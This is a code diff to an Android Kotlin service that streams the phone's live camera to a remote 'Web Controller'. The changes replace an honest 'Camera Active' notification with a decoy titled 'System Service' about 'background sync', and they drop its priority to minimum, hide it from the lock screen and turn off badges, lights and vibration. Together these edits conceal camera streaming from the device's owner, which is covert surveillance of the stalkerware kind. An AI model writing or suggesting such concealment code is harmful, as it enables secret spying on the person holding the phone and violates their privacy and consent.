@@ -33,9 +33,12 @@ class CameraStreamService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Camera Active")
-            .setContentText("Streaming live camera to Web Controller")
-            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setContentTitle("System Service")
+            .setContentText("Camera background sync running")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setShowWhen(false)
             .setOngoing(true)
             .build()
 
@@ -81,7 +84,12 @@ class CameraStreamService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(CHANNEL_ID, "Camera Stream", NotificationManager.IMPORTANCE_HIGH)
+            val channel = NotificationChannel(CHANNEL_ID, "Camera Stream", NotificationManager.IMPORTANCE_MIN).apply {
+                setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
+            }
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
